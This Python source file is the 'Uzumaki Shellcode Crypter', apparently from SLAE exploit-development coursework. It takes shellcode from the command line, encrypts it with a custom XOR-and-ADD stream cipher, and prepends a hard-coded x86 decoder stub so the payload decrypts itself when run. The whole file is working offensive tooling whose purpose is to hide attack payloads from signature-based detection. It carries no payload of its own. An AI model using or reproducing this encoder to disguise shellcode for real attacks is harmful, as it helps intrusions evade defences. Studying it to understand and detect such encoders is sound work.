#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Uzumaki Shellcode Crypter - Python Language
# Copyright (C) 2013 Geyslan G. Bem, Hacking bits
#
#   http://hackingbits.com
#   geyslan@gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

'''
   uzumaki_crypter

   * uses the uzumaki cipher, a custom stream cipher algorithm ( (XOR [static] and XOR [pseudorandom]), ADD [static] )


   # ./uzumaki_crypter.py -h
   # ./uzumaki_crypter.py -a 03 -x f2 -s $'\x31\xc9\xf7\xe1...\x80'

'''

import sys
import getopt
import string


def usage ():
    usage = """
  -a --add            Byte to be used with bitwise ADD (one byte in hex format)
                        Default is 01
                        Eg. -a 2f
                            --add 1f

  -x --xor            Byte to be used with bitwise XOR (one byte in hex format)
                        Default is cc
                        Eg. -x f2
                            --xor aa

  -s --shellcode      The shellcode to be crypted with the uzumaki cipher
                        Eg. -s $'\\xcd\\x80'
                            --shellcode `printf "\\xcc\\x90"`

  -h --help           This help
"""
    print(usage)

def main():
    addByte = "01"
    xorByte = "cc"
    shellcode = ""

    try:
        opts, args = getopt.getopt(sys.argv[1:], "ha:x:s:")

    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit()


    for o, a in opts:

        if o in ("-h", "--help"):
            usage()
            sys.exit()

        elif o in ("-a", "--add"):
            if (len(a) != 2 or not all(h in string.hexdigits for h in a)):
                print("  ADD byte has to be in hex format. Eg. -a 3f\n")
                sys.exit()
            addByte = a

        elif o in ("-x", "--xor"):
            if (len(a) != 2 or not all(h in string.hexdigits for h in a)):
                print("  XOR byte has to be in hex format. Eg. -x f1\n")
                sys.exit()
            xorByte = a

        elif o in ("-s", "--shellcode"):
            shellcode = a.encode("utf_8", "surrogateescape")


    if (not shellcode):
        print("  Is necessary to inform a shellcode. Eg. -s $'\\xcd\\x80'\n")
        sys.exit()


    crypted = ""
    crypted2 = ""
    crypted3 = ""
    crypted4 = ""
    tempbyte = 0x00

    for x in range(len(shellcode)):
        if (x == 0):
            tempbyte = shellcode[x]
        else:
            tempbyte = ((shellcode[x-1] ^ (shellcode[x] ^ int("0x" + xorByte, 16) )) + int("0x" + addByte, 16))
        if (tempbyte > 0xff or tempbyte <= 0x00):
            print("  A crypted byte value cannot be higher than 0xff or equal to 0x00. Please change the value of the option 'ADD' or/and of the option 'XOR'.\n")
            sys.exit()
        crypted += "\\x%02x" % tempbyte

    crypted2 = crypted.replace("\\x", ",0x")[1:]

    crypted3 += r"\x29\xc9\x74\x14\x5e\xb1"
    crypted3 += r"\x%02x" % (len(shellcode) - 1)
    crypted3 += r"\x46\x8b\x06\x83\xe8"
    crypted3 += r"\x" + addByte
    crypted3 += r"\x34"
    crypted3 += r"\x" + xorByte
    crypted3 += r"\x32\x46\xff\x88\x06\xe2\xf1\xeb\x05\xe8\xe7\xff\xff\xff"
    crypted3 += crypted

    crypted4 = crypted3.replace("\\x", ",0x")[1:]

    crypted = '"' + crypted + '";'
    crypted3 = '"'+ crypted3 + '";'

    print("Uzumaki Shellcode Crypter - Swirling Everything")
    print("http://hackingbits.com")
    print("https://github.com/geyslan/SLAE.git")
    print("License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n\n")

    print("Crypted shellcode:\n")
    print(crypted)
    print()
    print(crypted2)
    print("\n\n")

    print("Crypted shellcode with decrypter built-in:\n")
    print(crypted3)
    print()
    print(crypted4)
    print("\n\n")

    print("Length: %d" % len(bytearray(shellcode)))
    print("Length with decrypter: %d" % ((len(crypted3) - 2) / 4))


if __name__ == "__main__":
    main()